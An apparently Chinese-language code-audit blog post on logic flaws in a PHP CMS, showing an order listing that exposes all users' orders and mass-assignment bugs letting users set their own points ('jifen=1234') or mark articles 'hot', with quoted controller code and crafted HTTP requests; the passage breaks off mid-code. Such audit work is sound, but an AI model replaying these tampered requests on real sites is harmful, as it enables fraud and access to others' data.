alt="image-20200521225746233"></p><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="第一处逻辑漏洞——任意订单查看"><a href="#第一处逻辑漏洞——任意订单查看" class="headerlink" title="第一处逻辑漏洞——任意订单查看"></a>第一处逻辑漏洞——任意订单查看</h2><p>首先注册两个账号，账号A和账号B</p><p>然后用账号B购买一些商品，产生交易记录和订单号码</p><p><img src="http://images.xianyu123.club/20200603153339.png" alt="6535A2CA-C386-4812-A77A-2BBF84A37302"></p><p>然后在A用户这里我的钱包——交易记录可以看到其他人的交易订单</p><p><img src="http://images.xianyu123.club/20200330150851.png" alt="image-20200330150851225"></p><p>而且这里的订单号明显是更具时间戳进行命名的，我用其他A账户也可以直接访问到B账户的一些订单信息</p><p><img src="http://images.xianyu123.club/20200603135708.png" alt="image-20200603135708200"></p><p>然后我们来分析为什么</p><p><code>/Home/c/UserController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//购买列表</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buylist</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checklogin();</span><br><span class="line">    <span class="comment">//兑换记录</span></span><br><span class="line">    $page1 = <span class="keyword">new</span> Page(<span class="string">'buylog'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;type = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'type'</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;type==<span class="number">1</span>)&#123;</span><br><span class="line">$sql =<span class="string">" buytype='money' and type=2 "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;type==<span class="number">2</span>)&#123;</span><br><span class="line">$sql =<span class="string">" buytype='jifen' and type=1 "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$sql = <span class="string">" type=3 "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data1 = $page1-&gt;where($sql)-&gt;orderby(<span class="string">'addtime desc'</span>)-&gt;page(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'p'</span>,<span class="number">0</span>,<span class="number">1</span>))-&gt;go();</span><br><span class="line">$page1-&gt;file_ext = <span class="string">''</span>;</span><br><span class="line">$pages1 = $page1-&gt;pageList(<span class="number">5</span>,<span class="string">'?p='</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pages1 = $pages1;</span><br><span class="line"><span class="keyword">foreach</span>($data1 <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">$data1[$k][<span class="string">'date'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>,$v[<span class="string">'addtime'</span>]);</span><br><span class="line">$data1[$k][<span class="string">'details'</span>] = U(<span class="string">'user/buydetails'</span>,[<span class="string">'id'</span>=&gt;$v[<span class="string">'id'</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;lists1 = $data1;<span class="comment">//列表数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;sum1 = $page1-&gt;sum;<span class="comment">//总数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;listpage1 = $page1-&gt;listpage;<span class="comment">//分页数组-自定义分页可用</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;prevpage1 = $page1-&gt;prevpage;<span class="comment">//上一页</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;nextpage1 = $page1-&gt;nextpage;<span class="comment">//下一页</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;allpage1 = $page1-&gt;allpage;<span class="comment">//总页数</span></span><br><span class="line">    <span class="comment">//订单记录</span></span><br><span class="line">    $page = <span class="keyword">new</span> Page(<span class="string">'orders'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;type = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'type'</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;type==<span class="number">1</span>)&#123;</span><br><span class="line">$sql =<span class="string">" ptype=1 "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$sql =<span class="string">" ptype=2 "</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql.=<span class="string">"  and isshow!=0  "</span>;</span><br><span class="line">$data = $page-&gt;where($sql)-&gt;orderby(<span class="string">'addtime desc'</span>)-&gt;page(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'page'</span>,<span class="number">0</span>,<span class="number">1</span>))-&gt;go();</span><br><span class="line">$page-&gt;file_ext = <span class="string">''</span>;</span><br><span class="line">$pages = $page-&gt;pageList(<span class="number">5</span>,<span class="string">'?page='</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pages = $pages;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">$data[$k][<span class="string">'date'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>,$v[<span class="string">'addtime'</span>]);</span><br><span class="line">$data[$k][<span class="string">'orderdetails'</span>] =  U(<span class="string">'user/orderdetails'</span>,[<span class="string">'orderno'</span>=&gt;$v[<span class="string">'orderno'</span>]]);</span><br><span class="line">$data[$k][<span class="string">'orderdel'</span>] =  U(<span class="string">'user/orderdel'</span>,[<span class="string">'orderno'</span>=&gt;$v[<span class="string">'orderno'</span>]]);</span><br><span class="line">$data[$k][<span class="string">'buytype'</span>] = M(<span class="string">'buylog'</span>)-&gt;getField([<span class="string">'orderno'</span>=&gt;$v[<span class="string">'orderno'</span>]],<span class="string">'type'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;lists = $data;<span class="comment">//列表数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;sum = $page-&gt;sum;<span class="comment">//总数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;listpage = $page-&gt;listpage;<span class="comment">//分页数组-自定义分页可用</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;prevpage = $page-&gt;prevpage;<span class="comment">//上一页</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;nextpage = $page-&gt;nextpage;<span class="comment">//下一页</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;allpage = $page-&gt;allpage;<span class="comment">//总页数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;display(<span class="keyword">$this</span>-&gt;template.<span class="string">'/user/buy-list'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到第15行，这里在查询数据的时候，并没有查询某个特定用户，而是把所有人的购买记录都查询出来了，这样的话其他人都可以看到你的订单，你也可以看到其他人的订单。这里其实是开发者的问题，由于开发的失误才会导致这个问题。</p><h2 id="第二处逻辑漏洞——越权修改用户自己的积分"><a href="#第二处逻辑漏洞——越权修改用户自己的积分" class="headerlink" title="第二处逻辑漏洞——越权修改用户自己的积分"></a>第二处逻辑漏洞——越权修改用户自己的积分</h2><p>这里我们先演示一下结果，然后再去分析</p><p>首先我们注册一个账号，然后在后台看他的积分，是1积分</p><p><img src="http://images.xianyu123.club/20200528162723.png" alt="image-20200528162718125"></p><p>然后我们登录这个账号，然后在资料账户这里点提交抓包</p><p><img src="http://images.xianyu123.club/20200528163503.png" alt="image-20200528163503600"></p><p>然后在post字段中添加<code>jifen=1234</code>，发包</p><p><img src="http://images.xianyu123.club/20200528163547.png" alt="image-20200528163546966"></p><p>然后去后台看积分，发现积分已经被修改成了1234</p><p><img src="http://images.xianyu123.club/20200528163646.png" alt="image-20200528163646559"></p><p>接下来我们来分析一下为什么会这样</p><p>上面的用户资料账户的代码在<code>/Home/c/UserController.php</code>中的<code>userinfo</code>方法里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">userinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;checklogin();</span><br><span class="line"><span class="keyword">if</span>($_POST)&#123;</span><br><span class="line">$w = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$w[<span class="string">'tel'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tel'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'pass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'password'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'sex'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'sex'</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">$w[<span class="string">'repass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'repassword'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'username'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'username'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'email'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'email'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'signature'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'signature'</span>,<span class="number">1</span>);</span><br><span class="line">$w = get_fields_data($w,<span class="string">'member'</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($w[<span class="string">'tel'</span>]!=<span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^(13[0-9]|14[579]|15[0-3,5-9]|16[6]|17[0135678]|18[0-9]|19[89])\\d&#123;8&#125;$/"</span>,$w[<span class="string">'tel'</span>]))&#123;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'手机号码格式错误！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'手机号码格式错误！'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//檢查是否已經註冊</span></span><br><span class="line">$r = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'tel'</span>=&gt;$w[<span class="string">'tel'</span>]]);</span><br><span class="line"><span class="keyword">if</span>($r)&#123;</span><br><span class="line"><span class="keyword">if</span>($r[<span class="string">'id'</span>]!=<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>])&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'手机号已被注册！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'手机号已被注册！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($w[<span class="string">'username'</span>]==<span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'账户不能为空！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'账户不能为空！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($w[<span class="string">'pass'</span>]!=$w[<span class="string">'repass'</span>] &amp;&amp; $w[<span class="string">'pass'</span>]!=<span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'两次密码不同！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'两次密码不同！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($w[<span class="string">'email'</span>])&#123;</span><br><span class="line">$r = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'email'</span>=&gt;$w[<span class="string">'email'</span>]]);</span><br><span class="line"><span class="keyword">if</span>($r)&#123;</span><br><span class="line"><span class="keyword">if</span>($r[<span class="string">'id'</span>]!=<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'邮箱已被使用！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'邮箱已被使用！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'username'</span>=&gt;$w[<span class="string">'username'</span>]]);</span><br><span class="line"><span class="keyword">if</span>($r)&#123;</span><br><span class="line"><span class="keyword">if</span>($r[<span class="string">'id'</span>]!=<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'昵称已被使用！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'昵称已被使用！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($w[<span class="string">'pass'</span>]!=<span class="string">''</span>)&#123;</span><br><span class="line">$w[<span class="string">'pass'</span>] = md5(md5($w[<span class="string">'pass'</span>]).md5($w[<span class="string">'pass'</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">unset</span>($w[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="keyword">unset</span>($w[<span class="string">'repass'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$re = M(<span class="string">'member'</span>)-&gt;update([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>]],$w);</span><br><span class="line">$member = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>]]);</span><br><span class="line"><span class="keyword">unset</span>($member[<span class="string">'pass'</span>]);</span><br><span class="line">$_SESSION[<span class="string">'member'</span>] = array_merge($_SESSION[<span class="string">'member'</span>],$member);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'msg'</span>=&gt;<span class="string">'修改成功！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'修改成功！'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;display(<span class="keyword">$this</span>-&gt;template.<span class="string">'/user/userinfo'</span>);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后我们再来看admin那里修改用户积分的代码</p><p><code>/A/c/MemberController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">memberedit</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fields_biaoshi = <span class="string">'member'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'go'</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$data = get_fields_data($data,<span class="string">'member'</span>);</span><br><span class="line">$data[<span class="string">'username'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'username'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'email'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'email'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'address'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'address'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'province'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'province'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'city'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'city'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'signature'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'signature'</span>,<span class="number">1</span>);</span><br><span class="line">$data[<span class="string">'birthday'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'birthday'</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'pass'</span>]!=<span class="string">''</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'pass'</span>]!=$data[<span class="string">'repass'</span>])&#123;</span><br><span class="line">JsonReturn(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'两次密码不同！'</span>));</span><br><span class="line">&#125;</span><br><span class="line">$data[<span class="string">'pass'</span>]  =  md5(md5($data[<span class="string">'pass'</span>]).md5($data[<span class="string">'pass'</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">unset</span>($data[<span class="string">'pass'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(M(<span class="string">'member'</span>)-&gt;update(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$data[<span class="string">'id'</span>]),$data))&#123;</span><br><span class="line">JsonReturn(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'msg'</span>=&gt;<span class="string">'修改成功！'</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">JsonReturn(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'修改失败，请重新提交！'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;data = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;frparam(<span class="string">'id'</span>)]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;data)&#123;</span><br><span class="line">Error(<span class="string">'没有找到该用户！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;display(<span class="string">'member-edit'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>admin处修改的post表单如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin.php/Member/memberedit.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.**.net</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span>: http://www.**.net</span><br><span class="line"><span class="attribute">Referer</span>: http://www.**.net/admin.php/Member/memberedit/id/3.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=cdjbtp3sjhc70tg6pko7jguls5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">go=1&amp;id=3&amp;email=333%40qq.com&amp;tel=13011111111&amp;username=13011111111&amp;gid=1&amp;jifen=1234.00&amp;litpic=&amp;file=&amp;birthday=&amp;signature=&amp;province=&amp;city=&amp;address=&amp;pass=&amp;repass=</span><br></pre></td></tr></table></figure><p>也就是说这里表单会传递一个<code>jifen</code>字段提交给后端，然后update写入到数据库中，但是并没有判断是用户传递的还是admin传递的，这就造成了用户在修改资料的时候，直接提交一个<code>jifen</code>字段即可</p><p>所以我们就在用修改用户资料的地方直接传入一个参数<code>jifen=1234</code>就可以修改积分了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/userinfo.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.**.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Origin</span>: http://www.**.net</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://www.**.net/user/userinfo.html</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=6jgmku4kuk71mdljmai77cj432</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">litpic=&amp;file=&amp;username=13011111111&amp;tel=13011111111&amp;email=333%40qq.com&amp;sex=0&amp;province=&amp;city=&amp;address=&amp;password=&amp;repassword=&amp;signature=&amp;submit=%E6%8F%90%E4%BA%A4&amp;jifen=1234</span><br></pre></td></tr></table></figure><h2 id="第三处逻辑漏洞——越权修改自己的文章状态"><a href="#第三处逻辑漏洞——越权修改自己的文章状态" class="headerlink" title="第三处逻辑漏洞——越权修改自己的文章状态"></a>第三处逻辑漏洞——越权修改自己的文章状态</h2><p>这里我们先演示一下结果，然后再去分析</p><p>首先我们注册一个账号，然后点发布文章，随便发布一篇文章</p><p><img src="http://images.xianyu123.club/20200529162733.png" alt="image-20200529162727257"></p><p>然后在后台看到记录</p><p><img src="http://images.xianyu123.club/20200529162959.png" alt="image-20200529162959312"></p><p>然后我们在提交文章的地方添加字段<code>ishot=1</code></p><p><img src="http://images.xianyu123.club/20200529174835.png" alt="image-20200529174835245"></p><p>然后就可以看到文章是热属性了，虽然文章还没有被审核</p><p><img src="http://images.xianyu123.club/20200529174937.png" alt="image-20200529174937554"></p><p>跟第一个越权漏洞类似，该漏洞也是因为在用户端没有过滤参数所导致的，这样可以让用户进行恶意传递参数来导致文章的状态被修改</p><p><code>/A/c/ArticleController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 